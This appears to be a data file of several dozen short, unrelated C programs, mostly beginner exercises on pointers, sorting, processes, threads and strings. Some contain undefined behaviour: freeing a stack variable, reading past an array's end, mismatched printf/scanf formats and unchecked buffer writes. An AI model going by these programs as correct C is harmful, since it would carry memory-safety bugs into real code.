    "#include <stdio.h>\nint main(void){\nfloat vet[5] = {1.1,2.2,3.3,4.4,5.5};\nfloat *f;\nint i;\nf = vet;\nprintf(\"contador/valor/valor/endereco/endereco\");\nfor(i = 0 ; i <= 4 ; i++){\nprintf(\"\\n i = %d\",i);\nprintf(\" vet[%d] = %.1f\",i, vet[i]);\nprintf(\" *(f + %d) = %.1f\",i, *(f+i));\nprintf(\" &vet[%d] = %X\",i, &vet[i]);\nprintf(\" (f + %d) = %X\",i, f+i);\n}\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\nint main () {\n    char c, palavra[1000 + 1];\n    palavra[1000] = '\\0';\n    int n, tamanho, i;\n    scanf(\"%d\", &n);\n    scanf(\"%c\", &c);\n    while (n) {\n        tamanho = 0;\n        scanf(\"%c\", &c);\n        while (c != '\\n') {\n            tamanho++;\n            palavra[1000 - tamanho] = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ? c + 3 : c;\n            if (tamanho % 2 != 0) palavra[1000 - ((tamanho + 1) / 2)] = palavra[1000 - ((tamanho + 1) / 2)] - 1;\n            scanf(\"%c\", &c);\n        }\n        printf(\"%s\\n\", &palavra[1000 - tamanho]);\n        n--;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\nint is_vowel(char c) {\n    c = tolower(c);\n    return (c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u');\n}\nint count(int (*pred)(char c), char *word) {\n    int count = 0;\n    int len = strlen(word);\n    for(int i = 0; i < len; ++i) {\n        char c = word[i];\n        if(pred(c)) {\n            ++count;\n        }\n    }\n    return count;\n}\nint main(int argc, char* argv[]) {\n    printf(\"%d\\n\", count(is_vowel, argv[1]));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int x = 5;\n    int *p = &x;\n    free(p);\n    puts(\"END\");\n    return 0;\n}",
    "#include <stdio.h>\nint main (){\n    float horasTrab, valorSalMin, valorHoraTrab;\n    float salBruto, imposto, salarioReceber;\n    printf (\"Digite o n\u00famero de horas trabalhadas:\\n\");\n    scanf (\"%f%*c\",&horasTrab);\n    printf(\"Digite o valor do Sal\u00e1rio m\u00ednimo:\\n\");\n    scanf(\"%f%*c\",&valorSalMin);\n    valorHoraTrab=(valorSalMin / 2);\n    printf(\"O valor das horas trabalhadas \u00e9:%2.f\\n\",valorHoraTrab);\n    salBruto=(valorHoraTrab*horasTrab);\n    printf(\"O valor do salario bruto \u00e9:%2.f\\n\",salBruto);\n    imposto=(salBruto* 3 / 100);\n    printf(\"o valor do imposto \u00e9:%2.f\\n\",imposto);\n    salarioReceber=(salBruto-imposto);\n    printf(\"O valor do sal\u00e1rio a receber \u00e9:%2.f\\n\",salarioReceber);\n    return 0;\n}",
    "#include <stdio.h>\n\nint strcounta(char*);\nchar *strlower(char*);\nchar *strset(char*, char, int);\nint strwords(char*);\nint strpack(char*);\nvoid removelf(char*);\nint main(void) {\n   char s[50];\n   printf(\"Insira linha de texto: \");\n   fgets(s, 50, (stdin));\n   removelf(s);\n   printf(\"strcounta(s)      = %d\\n\", strcounta(s));\n   printf(\"strlower(s)       = '%s'\\n\", strlower(s));\n   printf(\"strset(s, 'a', 5) = '%s'\\n\", strset(s, 'a', 5));\n   printf(\"strword(s)        = %d\\n\", strwords(s));\n   printf(\"strpack(s)        = %d -> '%s'\\n\", strpack(s), s);\n}\nint strcounta(char *s){\n   int count = 0;\n   for (int i = 0; s[i] != '\\0'; i++)\n      if (((s[i] >= 'A') && (s[i] <= 'Z')) || ((s[i] >= 'a') && (s[i] <= 'z')))\n         count++;\n   return count;\n}\nchar *strlower(char *s) {\n   for (int i = 0; s[i] != '\\0'; i++) {\n      if ((s[i] >= 'A') && (s[i] <= 'Z'))\n         s[i] = s[i] + 'a' - 'A';\n   }\n   return s;\n}\nchar *strset(char *s, char ch, int n) {\n   for (int i = 0; (s[i] != '\\0') && (i < n); i++)\n      s[i] = ch;\n   return s;\n}\nint strwords(char *s) {\n   int count = 0;\n   if (s[0] == '\\0')\n      return count;\n   int lastspace = 1;\n   for (int i = 0; s[i] != '\\0'; i++) {\n      if (s[i] == ' ') {\n         if (!lastspace) {\n            count++;\n            lastspace = 1;\n         }\n      } else\n         lastspace = 0;\n   }\n   return count + !lastspace;\n}\nint strpack(char *s) {\n   int i = 1, j = 1;\n   char lastch = s[0];\n   if (lastch == '\\0')\n      return 0;\n   int count = 0;\n   while (s[i] != '\\0') {\n      if (s[i] != lastch) {\n         lastch = s[i];\n         s[j] = s[i];\n         j++;\n      } else\n         count++;\n      i++;\n   }\n   s[j] = '\\0';\n   return count;\n}\nvoid removelf(char *s) {\n   for (int i = 0; s[i] != '\\0'; i++) {\n      if (s[i] == 10 || s[i] == 13) {\n         s[i] = '\\0';\n         break;\n      }\n   }\n}",
    "#include <stdio.h>\nint fun1(int p,int b[],int len);\nint fun1(int p,int b[],int len)\n{\n    int j,x;\n    for(j=0;j<len;j++)\n    {\n        if(b[j]==p){x=j;break;}\n    }\n    return x;\n}\nint main(){\n    int b[20];\n    int aim[20][2];\n    int i,j;\n    int n,m;\n    scanf(\"%d\",&n);\n    scanf(\"%d\",&m);\n    for(i=0;i<m;i++){\n        scanf(\"%d%d\",&aim[i][0],&aim[i][1]);\n    }\n    for(i=0;i<n;i++){\n        b[i]=i+1;\n    }\n    for(i=0;i<m;i++){\n            int j;\n            int x,y;\n            x=fun1(aim[i][0],b,n);\n            y=fun1(aim[i][1],b,n);\n            if(x>y){\n                for(j=y;j<x;j++)\n                    b[j]=b[j+1];\n                for(j=x+1;j<n;j++)\n                    if(b[j]>aim[i][1])\n                        break;\n                else b[j-1]=b[j];\n                b[j-1]=aim[i][1];\n            }\n    }\n    for(i=0;i<n;i++)\n        printf(\"%d \",b[i]);\n        printf(\"\\n\");\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid atexit1() {\n printf(\"Executing atexit 1\\n\");\n}\nvoid atexit2() {\n printf(\"Executing atexit 2\\n\");\n}\nint main() {\n atexit(atexit1);\n atexit(atexit2);\n printf(\"Main done\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <values.h>\n\nint n, puncte[20];\nint min_c1, min_c2;\nvoid back(int stanga, int dreapta, int *m, int *c1, int *c2) {\n    int mijloc, cifra1s, cifra1d, cifra2s, cifra2d;\n    int min_st = *m;\n    int min_dr = *m;\n    printf(\"Caut minim in secventa [%d; %d]\\n\", stanga, dreapta);\n    if(stanga == dreapta) {\n        *m = puncte[stanga];\n    } else if(stanga == dreapta - 1) {\n        if(puncte[dreapta] - puncte[stanga] < *m) {\n            *m = puncte[dreapta] - puncte[stanga];\n            *c1 = stanga;\n            *c2 = dreapta;\n        }\n    } else {\n        mijloc = (stanga + dreapta) / 2;\n        back(stanga, mijloc, &min_st, &cifra1s, &cifra2s);\n        back(mijloc, dreapta, &min_dr, &cifra1d, &cifra2d);\n        if(min_st < min_dr) {\n            *m = min_st;\n            *c1 = cifra1s;\n            *c2 = cifra2s;\n        } else {\n            *m = min_dr;\n            *c1 = cifra1d;\n            *c2 = cifra2d;\n        }\n    }\n}\nint main() {\n    int i;\n    FILE *in = fopen(\"puncte.in\", \"rt\");\n    if(!in) return 0;\n    fscanf(in, \"%d\", &n);\n    for(i = 0; i < n; i++) {\n        int temp;\n        fscanf(in, \"%d\", &temp);\n        puncte[i] = temp;\n    }\n    int min = 2147483647, c1, c2;\n    back(0, n-1, &min, &c1, &c2);\n    printf(\"\\nMinimul este %d surprins intre pozitiile %d si %d\\n\", min, c1, c2);\n}",
    "#include <stdio.h>\n#include <stdio.h>\n\nint pyramid_sort(int *a, int *b)\n{\nint t = *a;\n*a = *b;\n*b = t;\nreturn 0;\n}\nint main()\n{\nint n, i, step = 0, b = 0;\nscanf (\"%i\", &n);\nint a[n];\nfor (i = 0; i < n; ++i)\nscanf (\"%i\", &a[i]);\nwhile (1)\n{\nb = 0;\nfor (i = 0; i < n; ++i)\n{\nif (i*2 + 2 + step < n)\n{\nif (a[i+step] > a[i*2 + 1 + step] || a[i + step] > a[i*2 + 2 + step])\n{\nif (a[i*2+1+step] < a[i*2+2+step])\n{\npyramid_sort(&a[i+step], &a[i*2+1+step]);\nb = 1;\n}\nelse if (a[i*2+2+step] < a[i*2+1+step])\n{\npyramid_sort(&a[i+step],&a[i*2+2+step]);\nb = 1;\n}\n}\n}\nelse if (i * 2 + 1 + step < n)\n{\nif (a[i+step] > a[i*2+1+step])\n{\npyramid_sort(&a[i+step], &a[i*2+1+step]);\nb=1;\n}\n}\n}\nif (!b)\nstep++;\nif (step+2==n)\nbreak;\n}\nfor (i = 0; i < n; ++i)\nprintf (\"%d\\t\", a[i]);\nprintf (\"\\n\");\nreturn 0;\n}",
    "char c_null = '\\0';\nchar c_zero = '0';\nint main () { return 0; }",
    "#include <stdio.h>\nvoid sort(int * a, int l)\n{\n    int max_p, i, j, temp;\n    for(i = 0; i < l; i++){\n        max_p = i;\n        for(j = i+1; j < l; j++){\n            if(a[j] > a[max_p]) max_p = j;\n        }\n        temp = a[i];\n        a[i] = a[max_p];\n        a[max_p] = temp;\n    }\n}\nint main()\n{\n    int t, m = 0, n = 0, i = 0, p = 0, q = 0, k, a[25], b[25], s[45];\n    char c;\n    do{\n        scanf(\"%d%c\", &t, &c);\n        a[m++] = t;\n    }while(c != '\\n');\n    sort(a, m);\n    do{\n        scanf(\"%d%c\", &t, &c);\n        b[n++] = t;\n    }while(c != '\\n');\n    sort(b, n);\n    while(p < m && q < n){\n        if(a[p] == b[q]){\n            p++, q++;\n        }else if(a[p] > b[q]){\n            s[i++] = a[p++];\n        }else{\n            s[i++] = b[q++];\n        }\n    }\n    while(p < m) s[i++] = a[p++];\n    while(q < n) s[i++] = b[q++];\n    for(k = 0; k < i; k++){\n        if(k != 0) printf(\" \");\n        printf(\"%d\", s[k]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint a[100001];\nint main()\n{\n    int n, k, m, i;\n    scanf(\"%d\",&n);\n    for(i=0; i<n; i++)\n    {\n        scanf(\"%d\",&m);\n        a[m]+=1;\n    }\n    scanf(\"%d\",&k);\n    for(i=100001;k>1;i--)\n        if(a[i]!=0)\n        k--;\n    printf(\"%d %d\",i,a[i]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void)\n{\n    pid_t pid;\n    if ((pid = fork()) < 0) {\n        perror(\"fork\");\n        exit(1);\n    } else if (pid == 0) {\n        printf(\"child PID == %d\\n\", getpid());\n        printf(\"child Group ID == %d\\n\", getpgid(0));\n        sleep(7);\n        printf(\"----Group ID of child is changed to %d\\n\", getpgid(0));\n        exit(0);\n    } else if (pid > 0) {\n        sleep(1);\n        setpgid(pid,pid);\n        sleep(13);\n        printf(\"\\nparent PID == %d\\n\", getpid());\n        printf(\"parent's parent process PID == %d\\n\", getppid());\n        printf(\"parent Group ID == %d\\n\", getpgid(0));\n        sleep(5);\n        setpgid(getpid(), getppid());\n        printf(\"\\n----Group ID of parent is changed to %d\\n\", getpgid(0));\n        while(1);\n    }\n    return 0;\n}",
    "void func(int b, int *a) {\n    *a = *a + b;\n}\nint main() {\n    int a = 87;\n    func(13, &a);\n    return a;\n}",
    "#include<stdio.h>\n\nvoid nhap(int a[],int n)\n{\n    for(int i=0;i<n;i++)\n        scanf(\"%d\",&a[i]);\n}\nvoid xuat(int a[],int n)\n{\n    for(int i=0;i<n;i++)\n        printf(\"%d\",&a[i]);\n        printf(\"\\n\");\n}\nint max(int a[],int n)\n{\n    int max=a[0];\n    for(int i=0;i<n;i++)\n        if(max<a[i])\n        max=a[i];\n    return max;\n}\nint min(int a[],int n)\n{\n    int min=a[0];\n    for(int i=0;i<n;i++)\n        if(min>a[i])\n        min=a[i];\n    return min;\n}\nint main()\n{\n    int a[100],n;\n    scanf(\"%d\",&n);\n    nhap(a,n);\n    printf(\"Gia tri lon nhat cua mang la %d tai vi tri: \",max(a,n));\n    for(int i=0;i<n;i++)\n        if(a[i]==max(a,n))\n            printf(\"%d\",i+1);\n    printf(\"\\n\");\n    printf(\"Gia tri nho nhat cua mang la %d tai vi tri: \",min(a,n));\n    for(int i=0;i<n;i++)\n        if(a[i]==min(a,n))\n            printf(\"%d\",i+1);\n        printf(\"\\n\");\n     return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint getValue(int *ar, size_t count, size_t pos);\nint main(int argc, char *argv[])\n{\n int rows = 13;\n int width = 4;\n if (argc > 1) {\n  rows = atoi(argv[1]);\n  if (argc > 2) {\n   width = atoi(argv[2]);\n  }\n }\n if (rows < 1 || width < 2) {\n  fprintf((stderr), \"Usage: %s [number-of-rows] [width]\\n\", argv[0]);\n  fprintf((stderr), \"* number-of-rows, if present, must be at least 1.\\n\");\n  fprintf((stderr), \"* width, if present, must be at least 2.\\n\");\n  fprintf((stderr), \"  - For best results, use an even number.\\n\");\n  return 255;\n }\n int *row = malloc(sizeof(int) * rows);\n int *prev = malloc(sizeof(int) * rows);\n row[0] = 1;\n prev[0] = 1;\n int i; for (i=0; i<rows; ++i) {\n  int j;\n  for (j=0; j<(rows - i - 1); ++j) {\n   int k; for (k=0; k < (width + 1) / 2; ++k) {\n    putchar(' ');\n   }\n  }\n  for (j=0; j<=i; ++j) {\n   printf(\"%*d \", width - 1, row[j]);\n  }\n  puts(\"\");\n  if (i < rows - 1) {\n   for (j=0; j<=i+1; ++j) {\n    row[j] = getValue(prev, i+1, j) + getValue(prev, i+1, j-1);\n   }\n   memcpy(prev, row, sizeof(int) * (i + 2));\n  }\n }\n free(row);\n free(prev);\n return 0;\n}\nint getValue(int *ar, size_t count, size_t pos)\n{\n if (pos < 0 || pos >= count) return 0;\n else return ar[pos];\n}",
    "#include <stdio.h>\nint main()\n{\n    int n;\n    printf(\"Enter the number of rows\");\n    scanf(\"%d\", &n);\n    for (int i = 1; i <= n; i++)\n    {\n        for (int j = 1; j <= n; j++)\n        {\n            if (i == 1 || i == n || j == 1 || j == n - i + 1 || i == j || j == n)\n            {\n                printf(\"* \");\n            }\n            else\n            {\n                printf(\"  \");\n            }\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\n\n\n\n\nint main()\n{\n    short temp;\n    short sum = 0;\n    unsigned short cnt = 0;\n    short minTemp;\n    unsigned short day = 0;\n    short maxNegTemp = (-32767 -1);\n    int isInit = !1;\n    do {\n        printf(\"T:\");\n        scanf(\"%hi\",&temp);\n        if (temp == 100){\n            break;\n        }\n        sum += temp;\n        ++cnt;\n        if (day == 0){\n            minTemp = temp;\n            day = 1;\n        }else if (minTemp > temp){\n            minTemp = temp;\n            day = cnt;\n        }\n        if (temp < 0){\n            if (isInit == !1){\n                maxNegTemp = temp;\n                isInit = !isInit;\n            }else if (maxNegTemp < temp){\n                maxNegTemp = temp;\n            }\n        }\n    } while(1);\n    if (!cnt){\n      printf(\"No temperatures...\\n\");\n    }else {\n        printf(\"Average T:%g\\n\",(float)sum/cnt);\n        printf(\"Min Temperature: %hi -> %hu\\n\", minTemp, day);\n        if (isInit){\n            printf(\"Max Negative Temperature is %hi\\n\", maxNegTemp);\n        }else {\n            printf(\"No negative temp...\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint min(int a, int b) {\n    if (a < b)\n        return a;\n    else\n        return b;\n}\nint main() {\n    printf(\"hello, world!\");\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int test,hour,minute,occur;\n    scanf(\"%d\",&test);\n    while(test--){\n        scanf(\"%d %d %d\",&hour,&minute,&occur);\n        if(hour <= 9){\n            printf(\"0%d:\",hour);\n        }\n        else{\n            printf(\"%d:\",hour);\n        }\n        if(minute <= 9){\n            printf(\"0%d\",minute);\n        }\n        else{\n            printf(\"%d\",minute);\n        }\n        if(occur == 0){\n            printf(\" - A porta fechou!\\n\");\n        }\n        else{\n            printf(\" - A porta abriu!\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid counter(void);\nint cont;\nint main(void)\n{\n counter();\n counter();\n system(\"pause\");\n return 0;\n}\nvoid counter(void)\n{\n printf(\"counter()\u5df2\u7d93\u88ab\u547c\u53eb%d\u6b21\u4e86...\\n\",++cont);\n}",
    "#include <stdio.h>\n\nint main(int argc, char **argv)\n{\n    int n;\n    int s = 2;\n    int p[2] = {1, 2};\n    while (1)\n    {\n        n = p[0] + p[1];\n        if (n > 4000000)\n            break;\n        if (n % 2 == 0)\n            s += n;\n        p[0] = p[1];\n        p[1] = n;\n    }\n    printf(\"%d\\n\", s);\n    return 0;\n}",
    "int main(void)\n{\n  return '\\xFF' == -1;\n}",
    "#include<stdio.h>\nint main()\n{\n    unsigned long long int n,i,s;\n    scanf(\"%llu\",&n);\n    if(n%2==0)\n    {\n        s=(n/2);\n        printf(\"%llu\\n\",s);\n    }\n    else{\n        s=1;\n        s=s+(n/2);\n        printf(\"-%llu\\n\",s);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\ndouble pow (double a, double b) {\n  int i;\n  double vpow = a;\n  for(i = 1; i < b; i++) {\n    vpow *= a;\n  }\n  return vpow;\n}\nint main() {\n  double raio, vEsf;\n  scanf(\"%lf\", &raio);\n  vEsf = pow(raio, 3) * 4 / 3 * 3.14159;;\n  printf(\"VOLUME = %.3lf\\n\", vEsf);\n  return 0;\n}",
    "typedef int a1;\na1 main()\n{\n  int x;\n  a1 a1;\n  x = 3;\n  a1 = x;\n  return a1;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid doc(int *a, int *b){\n    FILE* f=fopen(\"c2.txt\",\"r\");\n    fscanf(f,\"%d\", a);\n    fscanf(f,\"\\n\");\n    fscanf(f,\"%d\", b);\n    fclose(f);\n}\nint main(){\n    int* a;\n    int* b;\n    doc(&a, &b);\n    printf(\"%d\\n%d\", a,b);\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void)\n{\n int fd, ret;\n char buf[1024];\n pid_t pid;\n fd = open(\"myfifo\", ((0x04000000) | (0x10000000)));\n if((pid = fork()) > 0)\n {\n  for(;;)\n  {\n   ret = read(fd, buf, sizeof(buf));\n   buf[ret] = 0;\n   printf(\"Keyboard: %s\\n\", buf);\n  }\n }\n else if(!pid)\n {\n  for(;;)\n  {\n   ret = read(fd, buf, sizeof(buf));\n   buf[ret] = 0;\n   printf(\"Pipe: %s\\n\", buf);\n  }\n }\n else\n {\n  perror(\"fork() \");\n  exit(-1);\n }\n close(fd);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar *intToStr(int n) {\n    if (n == 0) { return \"0\"; }\n    char *s = (char *)malloc(sizeof(char) * 12);\n    for (int i = 0; i < 12; i++) {\n        s[i] = '\\0';\n    }\n    int a = n, r = 0, l = 0;\n    if (a < 0) {\n        s[0] = '-';\n        l = r = 1;\n        a *= -1;\n    }\n    while (a > 0) {\n        s[r++] = a%10 + '0';\n        a = a/10;\n    }\n    r--;\n    while (l < r) {\n        char temp = s[l];\n        s[l] = s[r];\n        s[r] = temp;\n        l++; r--;\n    }\n    return s;\n}\nchar* compressString(char* S){\n    int sl = (int)strlen(S);\n    if (S == ((void*)0) || sl < 2) { return S; }\n    char *ans = (char *)malloc(sizeof(char) * 50000);\n    for (int i = 0; i < 50000; i++) {\n        ans[i] = '\\0';\n    }\n    int count = 1, index = 0;\n    for (int i = 0; i < sl; i++) {\n        if (i + 1 < sl && S[i] == S[i+1]) {\n            count++;\n        } else {\n            ans[index++] = S[i];\n            if (count < 10) {\n                ans[index++] = count + '0';\n            } else {\n                char *intStr = intToStr(count);\n                strcat(ans, intStr);\n                index += strlen(intStr);\n                free(intStr);\n            }\n            count = 1;\n        }\n    }\n    return strlen(ans) > sl ? S : ans;\n}\nint main(int argc, const char * argv[]) {\n    char *a = \"abbeeeeeeeeeeeed\";\n    printf(\"%s\\n\", compressString(a));\n    printf(\"%s\\n\", intToStr(10));\n    return 0;\n}",
    "#include <stdio.h>\nint call_count = 0;\nint func()\n{\n  call_count++;\n  printf(\"Call count is now %d\\n\", call_count);\n}\nint main()\n{\n  int i;\n  for (i = 0; i < 5; i++) {\n    func();\n  }\n  return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main (void) {\n        pid_t p;\n        p = fork();\n        printf(\"fork returned %d\\n\", p);\n}",
    "#include <stdio.h>\nint main(){\n    int a=10;\n    int *p=&a;\n    a=a+1;\n    printf(\"Value is:%d\",*p);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int a;\n  do{\n  scanf(\"%d\",&a);\n  }while(a<0||a>9);\n  switch (a) {\n    case 0:printf(\"\\n zero\\n\");break;\n    case 1:printf(\"\\n one\\n\");break;\n    case 2:printf(\"\\n two\\n\");break;\n    case 3:printf(\"\\n three\\n\");break;\n    case 4:printf(\"\\n four\\n\");break;\n    case 5:printf(\"\\n five\\n\");break;\n    case 6:printf(\"\\n six\\n\");break;\n    case 7:printf(\"\\n seven\\n\");break;\n    case 8:printf(\"\\n eight\\n\");break;\n    case 9:printf(\"\\n nine\\n\");break;\n    case 10:printf(\"\\n ten\\n\");break;\n    }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(int argc, char *argv[])\n{\n  if (argc !=2 ) {\n    fprintf((stderr), \"Usage: %s microseconds:[us | -] \\n\", argv[0]);\n    exit(1);\n  }\n  usleep(atoi(argv[1]));\n  exit(0);\n}",
    "void f()\n{\n}\nvoid g()\n{\n  return f();\n}\nint main()\n{\n  g();\n}",
    "#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\nint sum(int numbersToAdd, ...);\nint main(int argc, char ** argv)\n{\n    int len = argc - 1;\n if(len != 5)\n {\n  printf(\"Please Input 5 numbers\\n\");\n  return -1;\n }\n    printf(\"argsNum: %d\\n\\n\", argc);\n for(int i=0;i<argc;i++)\n    {\n        printf(\"Data: %d == %s\\n\", i, argv[i]);\n    }\n int nums = sum(5, atoi(argv[1]), atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));\n printf(\"Nums : %d\\n\", nums);\n return 0;\n}\nint sum(int numbersToAdd, ...)\n{\n int sum = 0;\n va_list arguments;\n __builtin_va_start(arguments, numbersToAdd);\n for(int i=0;i<numbersToAdd;i++)\n {\n  sum += __builtin_va_arg(arguments, int);\n }\n __builtin_va_end(arguments);\n return sum;\n}",
    "#include<stdio.h>\nint main()\n{\n    printf(\"Hello, World!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint Adder(char *s)\n{\n   int i, j;\n   char t[100];\n   for(i=0; s[i]!='\\0'; i++)\n     t[i]=s[i];\n  t[i]='\\0';\n   for(i=0, j=0; t[i]!='\\0'; i++,j++)\n   { if(t[i]>='0' && t[i]<='9')\n      { s[j]='$';\n         j++;\n         s[j]=t[i];\n    }\n   else\n     s[j]=t[i];\n   }\n   s = '\\0';\n   return 0;\n}\nint main()\n{\n   char ori[100];\n   printf(\"Please input the string:\\n\");\n   scanf(\"%s\",ori);\n   Adder(ori);\n   printf(\"The new string is: %s\\n\",ori);\n}",
    "#include <stdio.h>\n#include <limits.h>\n\nint any(char s1[], char s2[]);\nint main()\n{\n    char s1[] = \"abcdefghijklmn\";\n    char s2[] = \"ihg\";\n    printf(\"s1: %s, s2: %s, any(s1, s2): %d\\n\", s1, s2, any(s1, s2));\n    return 0;\n}\nint any(char s1[], char s2[])\n{\n    int i;\n    char bucket[((127*2 +1) + 1)];\n    for (i = 0; i < ((127*2 +1) + 1); ++i) {\n        bucket[i] = 0;\n    }\n    for (i = 0; s2[i] != '\\0'; ++i) {\n        bucket[(unsigned char)(s2[i])] = 1;\n    }\n    for (i = 0; s1[i] != '\\0'; ++i) {\n        if (bucket[(unsigned char)(s1[i])]) {\n            return i;\n        }\n    }\n    return -1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main() {\n    int maxRandomNumber = 21;\n    int userGuess;\n    int guessCount = 0;\n    time_t t;\n    srand((unsigned)time(&t));\n    int randomNumber = rand() % maxRandomNumber;\n    do {\n        printf(\"Guess the random number between 1 and %d I'm thinking off.\\n\", maxRandomNumber-1);\n        printf(\"Your guess: \");\n        scanf(\"%d\", &userGuess);\n        if(userGuess != randomNumber)\n        {\n            printf(\"That's not it. Please try again.\\n\");\n            ++guessCount;\n            printf(\"You have %d tries left.\\n\", 5-guessCount);\n        }\n        if(userGuess == randomNumber)\n        {\n            printf(\"You won!\");\n            break;\n        }\n    } while (userGuess != randomNumber || guessCount < 5);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int i;\n for(i=33;i<127;i++){\n  printf(\"%d\\t%c\\n\",i,(char)i);\n}\nreturn 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<unistd.h>\n#include<pthread.h>\nint grade = 80;\nvoid *myThreadAdd(void *vargp)\n{\n int *myid = (int *)vargp;\n static int age = 17;\n ++age; ++grade;\n printf(\"Thread ID: %d, Age : %d, Grade: %d\\n\", *myid, age, ++grade);\n}\nint main()\n{\n int i;\n pthread_t tid;\n for(i = 0; i < 5; i++)\n  pthread_create(&tid, ((void*)0) , myThreadAdd, (void *)&tid);\n  pthread_exit(((void*)0));\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n, i=0;\n    float a, sum=0, avg;\n    scanf(\"%d\", &n);\n    do{\n        scanf(\"%f\", &a);\n        sum=sum+a;\n        i++;\n    }while(i<n);\n    printf(\"Sum: %.0f\", sum);\n    avg=sum/n;\n    printf(\"\\nAvg: %.2f\", avg);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint hcf(int a,int b){\n if(a==0 || b==0){\n  return 0;\n }\n else if(a==b){\n  return a;\n }\n else if(a>b){\n  return hcf(a-b,b);\n }\n return hcf(a,b-a);\n}\nint main(){\n int a,b;\n printf(\"Enter 2 numbers: \");\n scanf(\"%d%d\",&a,&b);\n printf(\"HCF of %d and %d is: %d\\n\",a,b,hcf(a,b));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint tiempo(int horas, int minutos, int segundos);\nint main(){\n    int horas, minutos, segundos;\n    printf(\"Ingrese horas minutos segundos: \");\n    scanf(\"%d %d %d\", &horas, &minutos, &segundos);\n    int resultado1 = tiempo(horas, minutos, segundos);\n    printf(\"Ingrese horas minutos segundos: \");\n    scanf(\"%d %d %d\", &horas, &minutos, &segundos);\n    int resultado2 = tiempo(horas, minutos, segundos);\n    printf(\"%d\\n\", abs(resultado2 - resultado1));\n}\nint tiempo(int horas, int minutos, int segundos){\n    int segundos_totales = 0;\n    segundos_totales = horas * 60 * 60;\n    segundos_totales += minutos * 60;\n    segundos_totales += segundos;\n    segundos_totales = segundos_totales % 43200;\n    return segundos_totales;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <assert.h>\nint main(int argc, char **argv) {\n    puts(\"Hello world\");\n    return 0;\n}",
    "#include <stdio.h>\nvoid stringReverse(char s[]){\n    char* ptr = s;\n    if(*ptr == '\\0')return;\n    stringReverse(ptr+1);\n    printf(\"%c\",*ptr);\n}\nint main(){\n    char s[9999];\n    scanf(\"%s\",s);\n    stringReverse(s);\n    puts(\"\");\n}",
    "#include <stdio.h>\n#include <math.h>\nint imprime(float i, float j);\nint main(){\n    int c = 0;\n    float i = 0, j = 1;\n    while(i <= 2.1){\n        c++;\n        if(c == 3){\n            imprime(i, j);\n            i += 0.2;\n            j = 0;\n            c = 0;\n        }\n        else{\n            imprime(i, j);\n        }\n        j++;\n    }\n}\nint imprime(float i, float j){\n    int id = (int)i, jd = (int)j;\n    float decI;\n    decI = i - trunc(i);\n    if(decI >= 0.2){\n        printf(\"I=%.1f J=%.1f\\n\", i, j + i);\n    }\n    else{\n        printf(\"I=%d J=%d\\n\", id, jd + id);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nlong long power(int base, int exponent)\n{\n    if (exponent == 0)\n    {\n        return 1;\n    }\n    if (exponent % 2 == 0)\n    {\n        long long result = power(base, exponent / 2);\n        return result * result;\n    }\n    return power(base, exponent - 1) * base;\n}\nint main()\n{\n    int base = 0;\n    int exponent = 0;\n    printf(\"Enter base:\");\n    scanf(\"%d\", &base);\n    printf(\"Enter exponent:\");\n    scanf(\"%d\", &exponent);\n    printf(\"base^exponent = %lld\", power(base, exponent));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a, b, c, d, y;\n    scanf(\" %d\", &y);\n    while(1)\n    {\n        y++;\n        a=y%10;\n        b=(y/10)%10;\n        c=(y/100)%10;\n        d=y/1000;\n        if(a!=b && a!=c && a!=d && b!=c && b!=d && c!=d)\n        {\n            printf(\"%d\\n\", y);\n            break;\n        }\n    }\n    return 0;\n}",
